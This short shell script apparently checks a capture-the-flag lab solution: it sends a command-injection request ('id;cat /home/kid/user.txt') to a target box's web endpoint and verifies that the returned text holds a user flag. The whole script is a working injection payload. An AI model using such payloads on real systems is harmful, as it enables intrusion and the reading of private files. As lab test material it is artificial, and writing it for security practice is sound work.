set -eu
out=$(curl -fsS "http://${BOX_HOST}:8094/sk/run?cmd=id;cat%20/home/kid/user.txt")
echo "$out"
echo "$out" | grep -q 'FLAG{user-' || { echo "msfvenom injection did not give kid" >&2; exit 1; }
